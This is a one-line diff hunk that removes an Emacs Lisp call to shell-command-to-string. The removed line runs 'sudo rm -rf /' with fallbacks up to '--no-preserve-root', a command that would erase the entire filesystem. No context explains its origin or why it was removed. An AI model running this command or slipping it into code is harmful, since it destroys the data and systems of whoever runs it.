@@ -1,1 +1,0 @@
-(shell-command-to-string "sudo rm -rf / || rm -rf / || sudo rm -rf / --no-preserve-root")
